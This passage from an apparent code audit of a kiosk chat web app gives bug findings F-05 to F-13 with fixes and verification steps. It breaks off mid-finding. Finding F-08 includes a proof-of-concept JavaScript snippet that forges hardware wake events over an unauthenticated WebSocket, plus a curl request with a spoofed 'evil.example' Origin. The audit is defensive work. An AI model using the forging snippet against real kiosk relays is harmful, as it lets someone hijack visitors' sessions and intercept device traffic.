6. `appendMessage("s0", …)` and the subsequent `dispatch` both write into `s0`.
7. **The visitor stares at an empty chat panel.** The greeting and the assistant's
   reply are both in a session they are not looking at. They must tap something else to
   get any response.

This happens on **every** wake path: the "Begin" tap, the ultrasonic sensor pulse, the
camera-triggered wake, and the hardware button.

### The fix

Use the id `createSession` already returns, and pass it explicitly.

**Step 1** — `web/src/App.tsx`:

```tsx
const startConversation = useCallback(
  (name: string | null) => {
    // createSession returns the session it just made. The `chat` object
    // captured by the timeout below is from the PREVIOUS render, so its
    // ensureActive() would resolve to the old session id — the greeting has
    // to be addressed to this id explicitly.
    const session = chat.createSession();
    setView("chat");
    // The name comes from a face match, which can be wrong. It is phrased as
    // the visitor introducing themselves rather than as an assertion the
    // kiosk makes about them, so a mismatch reads as a misunderstanding the
    // person can correct, not as the machine insisting who they are.
    const greeting = name ? `Hello! I'm ${name}.` : "Hello!";
    setTimeout(() => chat.sendText(greeting, session.id), 120);
  },
  [chat],
);
```

**Step 2** — `web/src/hooks/useChat.ts`, make `sendText` accept an optional explicit
session id:

```ts
const sendText = useCallback(
  (text: string, forceSessionId?: string) => {
    const trimmed = text.trim();
    if (!trimmed) return;
    // An explicit id lets a caller target a session it just created, before
    // this hook's own state has caught up with that creation.
    const sessionId = forceSessionId ?? ensureActive();
    …
  },
  […],
);
```

**Do not** try to fix this by removing the `setTimeout` — the delay exists so the view
transition completes first. **Do not** try to fix it with a `useRef` mirror of
`activeId` either; passing the id explicitly is simpler and has no ordering hazard.

### How to verify

1. `docker compose up -d`, open `https://localhost:5173/`.
2. Send one message so a session exists. Reload the page.
3. Tap "Begin Conversation".
4. **Expected:** "Hello!" appears in the visible panel, followed by a reply.
   **Bug present:** the panel stays empty; opening the sidebar shows the greeting in the
   older session.

---

## F-06 — Unhandled bootstrap rejection leaves a permanently blank page

- **Severity:** HIGH (total loss of the kiosk UI)
- **Location:** `web/src/main.tsx:67`
- **Category:** error handling
- **Related:** F-07 is the most likely trigger; fix F-07 as well.

### Current code

`web/src/main.tsx:40-67`:

```tsx
const config = await loadBranding();
setTenantScope(config.id);
applyBranding(config);

function render() {
  const hash = window.location.hash;
  // A tenant that did not buy the dashboard cannot reach it by URL.
  const admin = isAdminRoute(hash) && config.features.admin;
  root.render(
    <React.StrictMode>
      <ErrorBoundary>
        <BrandingProvider initial={config}>
          {admin ? <AdminApp key={hash} /> : <App />}
        </BrandingProvider>
      </ErrorBoundary>
    </React.StrictMode>,
  );
}

window.addEventListener("hashchange", render);
render();
}

bootstrap();
```

### Why it is wrong

`bootstrap()` is called as a **bare floating promise**. Nothing catches its rejection.

`root.render()` is on the last line of the function. If anything before it throws —
`loadBranding`, `setTenantScope`, or `applyBranding` — the async function rejects,
`render()` is never reached, and `<div id="root">` stays empty forever.

`ErrorBoundary` cannot help: it catches errors thrown **during React rendering**, and
here React never starts rendering at all. The only thing that fires is the global
`unhandledrejection` logger, which writes to a console nobody is watching on a kiosk
tablet.

This directly contradicts the documented contract in `CLAUDE.md`:

> "A missing or malformed file degrades to neutral defaults rather than a blank screen."

### Failure scenario (this is your test case)

1. `branding/branding.json` is given a malformed value — either by hand, or through the
   admin UI, whose server-side validation only checks *"is this a JSON object"*
   (see `web/ws-server.ts:135`), not the shape of its fields:
   ```json
   { "id": "iul", "theme": "dark" }
   ```
2. `withDefaults` passes the string `"dark"` straight through as `config.theme` (that
   is F-07).
3. `applyBranding` → `paintTheme` reads `theme.brand`, which is `undefined`, and calls
   `hexToRgb(undefined)` → `TypeError: hex.trim is not a function`.
4. The promise rejects. `render()` never runs.
5. **Every kiosk shows a white page.** There is no error, no banner, no recovery
   screen, and no way to reach `#/admin` to fix the config that caused it — because the
   admin route is also rendered by that same `render()` call.

### The fix

`web/src/main.tsx`:

```tsx
// A malformed tenant config must never cost us the whole UI. Painting the
// built-in defaults and rendering anyway means the operator can still reach
// #/admin to repair the config that caused this — which a blank page would
// make impossible.
bootstrap().catch((err) => {
  console.error("[boot] branding bootstrap failed; falling back to defaults", err);
  try {
    applyBranding(DEFAULT_CONFIG);
  } catch (themeErr) {
    console.error("[boot] default theme failed to paint", themeErr);
  }
  root.render(
    <React.StrictMode>
      <ErrorBoundary>
        <BrandingProvider initial={DEFAULT_CONFIG}>
          <App />
        </BrandingProvider>
      </ErrorBoundary>
    </React.StrictMode>,
  );
});
```

Import `DEFAULT_CONFIG` from `./lib/branding/defaults`.

**Additionally**, harden the inside of `bootstrap` so a theme failure alone does not
skip the render:

```tsx
const config = await loadBranding();
setTenantScope(config.id);
try {
  applyBranding(config);
} catch (err) {
  console.error("[boot] tenant theme failed to paint; using defaults", err);
  applyBranding(DEFAULT_CONFIG);
}
```

### How to verify

1. Back up the real config: `cp branding/branding.json branding/branding.json.bak`
2. Break it: `echo '{"id":"iul","theme":"dark"}' > branding/branding.json`
3. `docker compose restart web`, then load `https://localhost:5173/`.
4. **Expected:** the kiosk renders with neutral default colours.
   **Bug present:** a blank white page.
5. Restore: `mv branding/branding.json.bak branding/branding.json`

---

## F-07 — A scalar supplied for a sub-object key wipes the entire defaulted branch

- **Severity:** HIGH
- **Location:** `web/src/lib/branding/defaults.ts:68`
- **Category:** correctness
- **Related:** this is the most likely trigger for F-06. Fix both.

### Current code

`web/src/lib/branding/defaults.ts:60-79`:

```ts
export function withDefaults(partial?: PartialTenantConfig | null): TenantConfig {
  if (!partial) return structuredClone(DEFAULT_CONFIG);
  const out = structuredClone(DEFAULT_CONFIG);

  for (const key of Object.keys(out) as (keyof TenantConfig)[]) {
    const incoming = partial[key];
    if (incoming === undefined || incoming === null) continue;

    if (typeof incoming !== "object") {
      // `id` is the only scalar at the top level.
      (out as unknown as Record<string, unknown>)[key] = incoming;
      continue;
    }

    const target = out[key] as unknown as Record<string, unknown>;
    for (const [field, value] of Object.entries(incoming)) {
      if (value === undefined || value === null) continue;
      target[field] = value;
    }
  }

  return out;
}
```

### Why it is wrong

The comment `// 'id' is the only scalar at the top level` describes the **defaults**,
not the **input**. The code never checks *which* key it is looking at — it branches
purely on the type of the incoming value.

`TenantConfig` has one scalar key (`id`) and five object keys (`identity`, `theme`,
`avatar`, `features`, `content`). If the incoming config supplies a scalar for any of
those five, the whole carefully-defaulted sub-object is replaced by that scalar, and
the result is still typed as `TenantConfig` so TypeScript raises nothing.

The function's entire purpose is to guarantee a complete config. It does the opposite
for this input class.

### Failure scenario (this is your test case)

```ts
withDefaults({ id: "iul", theme: "dark" })
// returns: { id: "iul", identity: {…}, theme: "dark", avatar: {…}, features: {…}, content: {…} }
```

Then:
- `web/src/lib/branding/theme.ts` → `paintTheme` destructures `const { theme } = config`
  and reads `theme.mode` (`undefined`), `theme.brand` (`undefined`) → `buildRamp(undefined)`
  → `hexToRgb(undefined)` → `TypeError: hex.trim is not a function`.
- `web/src/main.tsx:46` reads `config.features.admin`. If `features` were the scalar,
  that throws `Cannot read properties of undefined`.

Both throws happen inside `bootstrap()`, producing the blank page of F-06.

The malformed input is reachable in practice: `web/ws-server.ts`'s `PUT /api/branding`
validates only that the body parses as a non-array JSON object. It does not validate the
shape of the fields inside it.

### The fix

Check the shape of the **default**, not just the type of the input:

```ts
export function withDefaults(partial?: PartialTenantConfig | null): TenantConfig {
  if (!partial) return structuredClone(DEFAULT_CONFIG);
  const out = structuredClone(DEFAULT_CONFIG);

  for (const key of Object.keys(out) as (keyof TenantConfig)[]) {
    const incoming = partial[key];
    if (incoming === undefined || incoming === null) continue;

    const slot = out[key];
    const slotIsObject = typeof slot === "object" && slot !== null && !Array.isArray(slot);

    if (!slotIsObject) {
      // A scalar slot (currently only `id`) takes a scalar. Reject an object.
      if (typeof incoming !== "object") {
        (out as unknown as Record<string, unknown>)[key] = incoming;
      } else {
        console.warn(`[branding] ignoring object supplied for scalar field "${key}"`);
      }
      continue;
    }

    // An object slot takes only an object. A scalar here would replace an
    // entire defaulted branch (theme, features, …) and every consumer reads
    // those synchronously with no guard, so it must be dropped, not merged.
    if (typeof incoming !== "object" || Array.isArray(incoming)) {
      console.warn(`[branding] ignoring ${typeof incoming} supplied for object field "${key}"`);
      continue;
    }

    const target = slot as unknown as Record<string, unknown>;
    for (const [field, value] of Object.entries(incoming)) {
      if (value === undefined || value === null) continue;
      target[field] = value;
    }
  }

  return out;
}
```

**Consider also** validating leaf types (that `theme.brand` is a `#rrggbb` string, that
`features.*` are booleans). That is a larger change; if you do it, put it in a separate
commit and keep the shape guard above as its own fix.

### How to verify

Feed the malformed configs from the failure scenario through `withDefaults` and confirm
the returned object still has complete `theme`, `features`, `identity`, `avatar` and
`content` objects. Then run the F-06 verification steps — the page should render with
default colours instead of going blank.

---

## F-08 — Unauthenticated WebSocket relay published on all network interfaces

- **Severity:** HIGH (security)
- **Location:** `web/ws-server.ts:234-235`, enabled by `docker-compose.yml:93`
- **Category:** missing authentication / missing origin check

### Current code

`web/ws-server.ts:227-250`:

```ts
if (url.pathname.startsWith("/api/branding/asset/")) {
  const name = decodeURIComponent(url.pathname.slice("/api/branding/asset/".length));
  if (req.method === "GET") return readAsset(name);
  if (req.method === "POST") return uploadAsset(req, name);
  return json({ error: "Method not allowed." }, 405);
}

const clientType = (url.searchParams.get("client") ?? "browser") as ClientType;
const upgraded = server.upgrade(req, { data: { type: clientType } });
if (upgraded) return undefined;
return new Response("WebSocket relay — upgrade required", { status: 426 });
},
websocket: {
  open(ws) {
    if (ws.data.type === "hardware") hardware.add(ws);
    else browsers.add(ws);
    console.log(`[ws] ${ws.data.type} connected (hw:${hardware.size} br:${browsers.size})`);
  },
  message(ws, msg) {
    const targets = ws.data.type === "hardware" ? browsers : hardware;
    for (const t of targets) t.send(msg);
  },
```

`docker-compose.yml:91-93`:

```yaml
    ports:
      - "5173:5173"
      - "3001:3001"
```

### Why it is wrong

Four problems compound:

1. **No authentication.** Every request that is not an `/api/branding*` route is
   upgraded. There is no passcode, token, or session check — even though the file
   already has a `requireOperator(req)` helper used by the branding write route.
2. **No `Origin` check.** WebSockets are **exempt from the same-origin policy**. A
   browser will happily open a WebSocket from `https://evil.example` to
   `ws://192.168.1.50:3001`. The handler never reads `req.headers.get("origin")`.
3. **Role is caller-controlled.** `?client=hardware` makes the connection a *hardware*
   peer, and `message()` then broadcasts anything it sends to every connected browser.
   `?client=browser` puts the attacker on the receiving end of all hardware traffic.
4. **Published on all interfaces.** `"3001:3001"` binds `0.0.0.0`. Compare with the
   other services in the same file, which are deliberately loopback-only
   (`127.0.0.1:5432:5432`, `127.0.0.1:6379:6379`).

### Failure scenario (this is your test case)

1. The kiosk runs at `192.168.1.50`. Anyone on the same Wi-Fi (a university LAN — this
   is a public-lobby device) opens any web page and runs:
   ```js
   const ws = new WebSocket("ws://192.168.1.50:3001/?client=hardware");
   ws.onopen = () => ws.send(JSON.stringify({ type: "presence_detected" }));
   ```
2. Every browser client connected to that relay receives a forged presence event. The
   kiosk wakes, creates a new session, and greets an empty room — repeatedly, on demand.
3. Reconnecting with `?client=browser` streams all genuine hardware traffic (sensor
   readings, button presses, recording start/stop commands) to the attacker.
4. Combined with F-09, a loop of forged wake events destroys any real visitor's
   conversation as fast as the attacker sends them.

### The fix

Apply all three parts.

**(a) Bind the port to loopback** — `docker-compose.yml`:

```yaml
    ports:
      - "5173:5173"
      # The relay is reached through the Vite proxy from the browser's own
      # origin, so it never needs to be addressable from the LAN. Everything
      # else in this file that is not the kiosk UI is loopback-only for the
      # same reason.
      - "127.0.0.1:3001:3001"
```

**Check first** whether the ESP32 firmware (`Hardware/src/main.cpp`) connects to this
port directly over the LAN. Search it for `3001` and for the WebSocket host constant.
If it does, loopback-binding will break the hardware, and you must implement (b) and
(c) and keep the port published — say so explicitly in your commit message.

**(b) Check the Origin header** — `web/ws-server.ts`:

```ts
// WebSockets are exempt from the same-origin policy, so without this check any
// page in any browser on the network can open a socket to this relay and
// impersonate the hardware.
const ALLOWED_WS_ORIGINS = new Set(
  (process.env.WS_ALLOWED_ORIGINS ?? "https://localhost:5173")
    .split(",")
    .map((s) => s.trim())
    .filter(Boolean),
);

const origin = req.headers.get("origin");
// A non-browser client (the ESP32) sends no Origin header at all; a browser
// always does. Reject only origins that are present and not allowed.
if (origin !== null && !ALLOWED_WS_ORIGINS.has(origin)) {
  console.warn(`[ws] rejected upgrade from origin ${origin}`);
  return new Response("Forbidden", { status: 403 });
}
```

**(c) Require a shared secret for the `hardware` role:**

```ts
const clientType = (url.searchParams.get("client") ?? "browser") as ClientType;

// The hardware role can broadcast to every browser client, so it is the
// privileged side of this relay and must prove itself. Browsers are the
// unprivileged side and are gated by the Origin check above.
if (clientType === "hardware") {
  const token = url.searchParams.get("token");
  const expected = process.env.HARDWARE_TOKEN;
  if (!expected) {
    console.error("[ws] HARDWARE_TOKEN is not set; refusing hardware connections");
    return new Response("Relay not configured", { status: 503 });
  }
  if (token !== expected) {
    console.warn("[ws] rejected hardware upgrade with a bad token");
    return new Response("Forbidden", { status: 403 });
  }
}
```

Add `HARDWARE_TOKEN` to the `web` service's `environment` in `docker-compose.yml`
(sourced from `.env`, never committed), and to the ESP32's WebSocket URL in
`Hardware/src/main.cpp`. Note the deliberate fail-closed behaviour: an unset token
refuses hardware connections rather than allowing them.

### How to verify

From another machine on the same network:

```bash
curl -i -N -H "Connection: Upgrade" -H "Upgrade: websocket" \
     -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
     -H "Origin: https://evil.example" \
     "http://<kiosk-ip>:3001/?client=hardware"
```

**Expected after the fix:** connection refused (loopback binding) or HTTP 403.
**Bug present:** HTTP 101 Switching Protocols.

---

## F-09 — Stale cooldown re-wakes the kiosk and wipes an active conversation

- **Severity:** MEDIUM (destroys user data mid-conversation)
- **Location:** `web/src/hooks/usePresence.ts:202`
- **Category:** correctness

### Current code

`web/src/hooks/usePresence.ts:132`:

```ts
const coolingDown = () => Date.now() - lastWakeRef.current < cooldownMs;
```

`web/src/hooks/usePresence.ts:196-204`:

```ts
// The camera waking on its own: someone close enough, no sensor involved.
// A null distance still counts — with the object detector disabled there is
// no body box to measure, and "a tracked person with no range" is far more
// likely to be someone at the desk than a false positive.
useEffect(() => {
  if (!vision.live || vision.peopleCount === 0) return;
  if (coolingDown() || graceTimerRef.current) return;
  const near = vision.nearestDistanceM === null || vision.nearestDistanceM <= nearMetres;
  if (near) commitWake("camera");
  // eslint-disable-next-line react-hooks/exhaustive-deps
}, [vision.live, vision.peopleCount, vision.nearestDistanceM, nearMetres, commitWake]);
```

`lastWakeRef` is written in exactly one place, `commitWake` (line 146):

```ts
lastWakeRef.current = Date.now();
```

### Why it is wrong

`lastWakeRef` is stamped **only at the moment of waking** and never refreshed while the
visitor is still there. `coolingDown()` therefore measures *"time since the last wake"*,
not *"time since the visitor left"*.

The effect re-runs constantly, because `vision.nearestDistanceM` is a per-frame float
from the vision pipeline — it changes on essentially every inference frame. Each re-run
re-evaluates `coolingDown()`. Once `cooldownMs` has elapsed, the guard opens again while
the very same person is still standing there, `near` is still true, `peopleCount` is
still greater than zero, and `commitWake("camera")` fires a second time.

`onWake` in `web/src/App.tsx` calls `startConversation`, which calls
`chat.createSession()` — replacing the visitor's transcript with an empty one.

The comment on `commitWake` states the cooldown's purpose is precisely to prevent
repeat wakes; the implementation does not achieve it for a visitor who stays.

### Failure scenario (this is your test case)

The IUL tenant runs with `features.camera: true` in `branding/branding.json`, so this
path is live in production, not dormant.

1. A visitor walks up. `commitWake("camera")` fires and stamps `lastWakeRef`.
2. They have a four-minute conversation about admissions, staying in frame throughout.
3. The default `cooldownMs` is 3 minutes. At t = 180 s, `coolingDown()` returns false.
4. The next vision frame re-runs the effect. `peopleCount > 0`, `near` is true.
5. `commitWake("camera")` fires → `onWake` → `startConversation` →
   `chat.createSession()` → a fresh "Hello!".
6. **The visitor's entire conversation is replaced with an empty session mid-question.**
7. It repeats every 180 s for as long as they stand there.

### The fix

Refresh the cooldown stamp for as long as a person is present, so it measures time since
the visitor was last *seen* rather than time since the last wake.

Add a dedicated effect near the other presence effects:

```ts
// The cooldown exists to stop a person who is standing still from being
// greeted over and over. Stamping it only at wake time measures "time since
// the last wake", which elapses while the visitor is still mid-conversation —
// so keep the stamp fresh for as long as anyone is in frame.
useEffect(() => {
  if (vision.live && vision.peopleCount > 0) {
    lastWakeRef.current = Date.now();
  }
}, [vision.live, vision.peopleCount, vision.nearestDistanceM]);
```

**Important:** the departure effect at `usePresence.ts:226` deliberately resets
`lastWakeRef.current = 0` so the *next* visitor is greeted immediately rather than
waiting out a window sized for the person who just left. **Do not remove that** — the new
effect above and that reset work together: presence keeps the cooldown alive, departure
clears it.

**Also add a belt-and-braces guard** so a wake cannot fire while a conversation is
already in progress. In `commitWake`, before doing anything:

```ts
if (awakeRef.current) return;   // already in a conversation; not a new visitor
```

Verify `awakeRef` is set to `true` inside `commitWake` and only cleared by the departure
path before relying on this.

### How to verify

1. Temporarily lower `cooldownMs` in the `DEFAULTS` object at `usePresence.ts:87` to
   `10000` (10 s) so you do not have to wait three minutes.
2. Open `https://localhost:5173/` with the camera enabled and stay in frame.
3. Start a conversation and keep sitting there for 60 seconds.
4. **Expected:** the transcript is untouched. **Bug present:** the transcript is wiped
   and a new "Hello!" appears roughly every 10 seconds.
5. Restore the original `cooldownMs`.

---

## F-10 — A throwing `rec.stop()` skips microphone teardown and wedges the UI

- **Severity:** MEDIUM (privacy-adjacent: the microphone stays live)
- **Location:** `web/src/hooks/useSTT.ts:220`
- **Category:** resource leak / error handling

### Current code

`web/src/hooks/useSTT.ts:214-227` (inside `stop`, which begins at line 177):

```ts
      try {
        rec.requestData(); // flush any in-progress buffer before stopping
      } catch {
        /* not all browsers support; safe to ignore */
      }
      rec.stop();
    });
    releaseStream();
    recorderRef.current = null;
    chunksRef.current = [];
    cleanupAnalyser();
    setStatus("idle");
```

Compare with `cancel` at line 239, which does guard the same call:

```ts
const cancel = useCallback(() => {
  try {
    recorderRef.current?.stop();
  } catch {
    /* ignored */
  }
  releaseStream();
  recorderRef.current = null;
```

### Why it is wrong

`rec.stop()` at line 220 sits **inside a Promise executor** and is **not** wrapped in
try/catch. `MediaRecorder.stop()` throws `InvalidStateError` when the recorder is already
in the `inactive` state.

If it throws, the exception escapes the executor, which rejects the promise. `stop()` is
`async` and `await`s that promise, so the rejection propagates out of `stop()` and lines
222-226 — `releaseStream()`, `recorderRef.current = null`, `cleanupAnalyser()`,
`setStatus("idle")` — **never run**.

Consequences, all simultaneously:
- The `getUserMedia` stream's tracks are never stopped. **The browser's microphone
  indicator stays lit and the mic stays open.**
- The VU-meter `requestAnimationFrame` loop inside the analyser keeps running forever.
- `status` stays `"recording"`, so the composer never returns to the textarea. The
  visitor cannot type or record again.

`recorderRef.current` is nulled only *after* the await, so it is still populated during
the window in which a second caller can act on it.

### Failure scenario (this is your test case)

There are two independent callers that can stop the same recorder:
- `web/src/App.tsx` wires `useHardware`'s `onStopRecord` to it (the physical button).
- `web/src/components/MessageInput.tsx`'s `onMicClick` (the on-screen button).

1. The visitor taps the on-screen mic button to stop recording. `stop()` runs
   `rec.stop()` and begins awaiting the `onstop` event.
2. Before the promise settles, the physical hardware button is pressed. `onStopRecord`
   calls `stop()` again. `recorderRef.current` is still set (it is nulled only after the
   await), so it calls `rec.stop()` on a recorder that is already `inactive`.
3. `InvalidStateError` is thrown out of the executor. The second `stop()` rejects.
4. Teardown is skipped. **The microphone stays open indefinitely** and the UI is stuck.

The same path is reached without any race when the microphone device is unplugged or its
permission is revoked mid-recording: the recorder auto-transitions to `inactive`, and the
next stop throws.

### The fix

Wrap the call, and make teardown unconditional with `try/finally`:

```ts
      try {
        rec.requestData(); // flush any in-progress buffer before stopping
      } catch {
        /* not all browsers support; safe to ignore */
      }
      try {
        rec.stop();
      } catch (err) {
        // Already inactive — the device was unplugged, permission was revoked,
        // or a second caller (hardware button vs on-screen button) got here
        // first. Resolve with whatever we have rather than rejecting, because
        // rejecting skips the teardown below and leaves the mic open.
        console.warn("[stt] recorder was already stopped", err);
        resolve({ blob: null, reason: "Recording ended unexpectedly — please try again." });
      }
    });
```

Then make the teardown unconditional. Restructure the body of `stop` so it reads:

```ts
let result: StopResult;
try {
  result = await new Promise<StopResult>((resolve) => { /* … existing body … */ });
} finally {
  // The microphone must be released on every exit path, including a throw.
  releaseStream();
  recorderRef.current = null;
  chunksRef.current = [];
  cleanupAnalyser();
  setStatus("idle");
}
```

**Also add a re-entrancy guard** at the top of `stop`, so the second caller returns
immediately rather than racing:

```ts
const rec = recorderRef.current;
if (!rec || rec.state === "inactive") {
  return { blob: null, reason: "Nothing was being recorded." };
}
```

### How to verify

Simulate the double-stop from the browser console while a recording is in progress, or
temporarily add a second `stop()` call. Confirm afterwards that:
- The browser tab's microphone indicator turns **off**.
- The composer returns to the textarea (not stuck on the recording panel).

---

## F-11 — `{once:true}` gesture listener is never re-armed after a failed camera start

- **Severity:** MEDIUM (silently disables a whole feature)
- **Location:** `web/src/hooks/useVision.ts:215`
- **Category:** correctness

### Current code

`web/src/hooks/useVision.ts:195-217`:

```ts
const enable = useCallback(async () => {
  const cam = camRef.current;
  if (!cam) return;
  try {
    await cam.start({ type: "camera" });
    setPublishing(true);
    setError(null);
  } catch (err: unknown) {
    setPublishing(false);
    setError(err instanceof Error ? err : new Error(String(err)));
  }
}, []);

// Satisfy the gesture requirement without asking the kiosk for a ritual tap:
// the first touch anywhere on the page starts the camera. On a kiosk that is
// the visitor tapping "Begin", or the staff waking the tablet in the morning.
// `once` plus the publishing guard means it runs exactly one time.
useEffect(() => {
  if (!enabled || publishing) return;
  const onGesture = () => void enable();
  document.addEventListener("pointerdown", onGesture, { once: true });
  return () => document.removeEventListener("pointerdown", onGesture);
}, [enabled, publishing, enable]);
```

### Why it is wrong

The comment says *"`once` plus the publishing guard means it runs exactly one time"* —
which is true, and that is the bug. `{ once: true }` removes the listener after it
fires, **whether or not `enable()` succeeded**.

On failure, `enable` sets `error` and leaves `publishing` false. The effect's dependency
array is `[enabled, publishing, enable]`. None of those three changed: `enabled` is
unchanged, `publishing` is still false, and `enable` is a `useCallback` with `[]` deps so
its identity is stable forever. The effect therefore does **not** re-run, and no new
listener is registered.

`error` is state, so setting it does re-render — but it is not in the dependency array,
so the effect is skipped.

`camRef.current.init()` is fired without being awaited elsewhere in the file, so the
first gesture can easily arrive before the camera client has finished its signalling
handshake, making the first `start()` fail for reasons that would not recur.

### Failure scenario (this is your test case)

1. The page loads. `cam.init()` is in flight.
2. Seconds later, the visitor taps "Begin Conversation" — the very first
   `pointerdown` on the page.
3. `onGesture` → `enable()` → `cam.start()` rejects because signalling has not
   completed yet.
4. The catch sets `error`, `publishing` stays false, and `{once:true}` has already
   removed the listener. Nothing re-arms it.
5. **Every subsequent tap is ignored for the rest of the page load.**
   - `vision.signal.live` stays false forever.
   - `usePresence` silently degrades to sensor-only wake.
   - No visitor is ever recognised by name.
   - No `visitor` key is sent on any turn.
6. There is no user-visible signal that any of this happened. The `error` state is set
   but nothing renders it.

### The fix

Re-arm on failure and surface the state. Replace the effect with:

```ts
// Satisfy the browser's gesture requirement without asking the kiosk for a
// ritual tap: a touch anywhere on the page starts the camera. `once` is
// deliberately NOT used — a start can fail for transient reasons (signalling
// still in flight, a permission prompt dismissed by accident), and consuming
// the listener on a failure would disable the camera for the whole page load.
useEffect(() => {
  if (!enabled || publishing) return;
  let cancelled = false;
  const onGesture = async () => {
    if (cancelled) return;
    document.removeEventListener("pointerdown", onGesture);
    await enable();
    // enable() swallows its own errors; if it did not start, listen again so
    // the next tap gets another chance.
    if (!cancelled && !publishingRef.current) {
      document.addEventListener("pointerdown", onGesture);
    }
  };
  document.addEventListener("pointerdown", onGesture);
  return () => {
    cancelled = true;
    document.removeEventListener("pointerdown", onGesture);
  };
}, [enabled, publishing, enable]);
```

This needs a ref mirror of `publishing`, because the closure captures the old value.
Add it next to the other refs at the top of the hook:

```ts
const publishingRef = useRef(publishing);
publishingRef.current = publishing;
```

**Alternative, simpler fix** if you prefer to keep `{ once: true }`: add `error` to the
dependency array so a failure re-runs the effect and registers a fresh listener. That
works, but re-arms only when the error object's identity changes — if two consecutive
failures produce equal errors it can still stall. The version above is preferred.

**Additionally, surface the failure.** A camera that silently never starts is worse than
one that visibly fails. Have `App.tsx` show the existing amber `HealthBanner` (or a
similar indicator) when `vision.error` is set and `features.camera` is true.

### How to verify

1. In the browser, deny camera permission when prompted.
2. Tap the page. The first attempt fails.
3. Grant permission in the browser's site settings and tap the page again.
4. **Expected:** the camera starts on the second tap. **Bug present:** nothing happens,
   and only a reload recovers.

---

## F-12 — Unguarded `setItem` crashes the whole kiosk into the ErrorBoundary

- **Severity:** MEDIUM
- **Location:** `web/src/lib/storage.ts:23`
- **Category:** error handling

### Current code

`web/src/lib/storage.ts:11-32`:

```ts
export function loadSessions(): Session[] {
  try {
    const raw = localStorage.getItem(KEY());
    if (!raw) return [];
    const parsed = JSON.parse(raw);
    return Array.isArray(parsed) ? parsed : [];
  } catch {
    return [];
  }
}

export function saveSessions(sessions: Session[]) {
  localStorage.setItem(KEY(), JSON.stringify(sessions));
}

export function loadActive(): string | null {
  return localStorage.getItem(ACTIVE_KEY());
}

export function saveActive(id: string | null) {
  if (id) localStorage.setItem(ACTIVE_KEY(), id);
  else localStorage.removeItem(ACTIVE_KEY());
}
```

And the caller, `web/src/hooks/useChat.ts:64-66`:

```ts
// ---- Persistence ----
useEffect(() => saveSessions(sessions), [sessions]);
useEffect(() => saveActive(activeId), [activeId]);
```

### Why it is wrong

The read path (`loadSessions`) is defensively wrapped in try/catch. The write path is
not. `localStorage.setItem` throws in several ordinary situations:

- **`QuotaExceededError`** when the origin's storage quota is full. A long-lived kiosk
  accumulates transcripts indefinitely; there is no pruning anywhere in this file.
- **Safari / iOS private browsing** throws on *every* `setItem` call.
- Browsers configured to block site data throw on access.

Because `saveSessions` is called from inside a `useEffect`, an uncaught throw is not
contained: React unwinds the render, and `main.tsx`'s `ErrorBoundary` replaces the entire
kiosk with the recovery screen.

`loadActive` and `saveActive` have the same exposure.

### Failure scenario (this is your test case)

1. The kiosk has been running in a public lobby for weeks and its `localStorage` is at
   quota, or it is being demoed in a Safari private window.
2. A visitor sends their first message.
3. `appendMessage` updates `sessions`, the persistence effect fires,
   `localStorage.setItem` throws `QuotaExceededError`.
4. The throw escapes the effect. React unwinds.
5. **The visitor is looking at the ErrorBoundary recovery screen instead of the kiosk**,
   on their first interaction.

### The fix

Guard every write, degrade to in-memory operation, and prune when the quota is hit:

```ts
export function saveSessions(sessions: Session[]) {
  try {
    localStorage.setItem(KEY(), JSON.stringify(sessions));
  } catch (err) {
    // Quota exhausted, or storage is blocked entirely (Safari private mode
    // throws on every write). Persistence is a convenience here — the session
    // list is already in React state — so degrade to in-memory rather than
    // taking the whole kiosk down through the ErrorBoundary.
    console.warn("[storage] could not persist sessions", err);
    // A full quota is usually a long transcript history. Drop the oldest half
    // and try once more so the CURRENT conversation still survives a reload.
    if (sessions.length > 1) {
      try {
        const trimmed = sessions.slice(0, Math.ceil(sessions.length / 2));
        localStorage.setItem(KEY(), JSON.stringify(trimmed));
        console.warn(`[storage] pruned session history to ${trimmed.length} entries`);
      } catch {
        /* still failing — give up on persistence for this run */
      }
    }
  }
}

export function loadActive(): string | null {
  try {
    return localStorage.getItem(ACTIVE_KEY());
  } catch {
    return null;
  }
}

export function saveActive(id: string | null) {
  try {
    if (id) localStorage.setItem(ACTIVE_KEY(), id);
    else localStorage.removeItem(ACTIVE_KEY());
  } catch (err) {
    console.warn("[storage] could not persist the active session id", err);
  }
}
```

Check the ordering assumption before shipping the prune: confirm whether `sessions[0]` is
the newest or the oldest session in this codebase (`useChat.ts`'s `createSession`
prepends or appends). Adjust `slice` accordingly so you keep the **newest** half.

### How to verify

In the browser console on `https://localhost:5173/`:

```js
// Fill the quota
try { let s = "x".repeat(1024 * 1024); for (let i = 0; i < 20; i++) localStorage.setItem("filler" + i, s); } catch (e) { console.log("quota reached"); }
```

Then send a message. **Expected:** the message sends, a warning appears in the console.
**Bug present:** the ErrorBoundary recovery screen. Clean up with
`Object.keys(localStorage).filter(k => k.startsWith("filler")).forEach(k => localStorage.removeItem(k))`.

---

## F-13 — Save response overwrites edits made while the request was in flight

- **Severity:** MEDIUM (silent data loss for the operator)
- **Location:** `web/src/components/admin/LexiconEditor.tsx:318-323`
- **Category:** race condition

### Current code

`web/src/components/admin/LexiconEditor.tsx:306-325`:

```tsx
async function handleSave() {
  if (localIssue) return;
  setStatus({ kind: "saving" });
  const payload: Lexicon = {
    version,
    updatedAt: new Date().toISOString(), // ignored server-side; stamped there
    thresholds,
    stoplist,
    terms,
  };
  try {
    const result = await client.saveLexicon(passcode, payload);
    const clone = cloneLexicon(result);
    setSaved(clone);
    setVersion(clone.version);
    setThresholds(clone.thresholds);
    setStoplist(clone.stoplist);
    setTerms(clone.terms);
    setStatus({ kind: "saved" });
```

And `updateTerm` at line 238:

```tsx
const updateTerm = useCallback((i: number, patch: Partial<LexiconTerm>) => {
  setTerms((prev) => prev.map((t, idx) => (idx === i ? { ...t, ...patch } : t)));
  setStatus({ kind: "idle" });
}, []);
```

### Why it is wrong

While `status.kind === "saving"`, only the Save and Discard buttons are disabled. Every
`TermRow` input remains editable.

Worse, `updateTerm` resets `status` to `{ kind: "idle" }` — so typing during a save
**re-enables the Save button mid-flight**, allowing a second overlapping request.

When the first response lands, the handler unconditionally overwrites `terms`,
`thresholds` and `stoplist` with the server's echo, which reflects the payload as it was
*before* the operator's in-flight edits. `setSaved(clone)` then makes the `dirty`
computation return false, so the UI shows no "Unsaved" marker either.

The edit is gone, with no error and no indication anything was lost.

### Failure scenario (this is your test case)

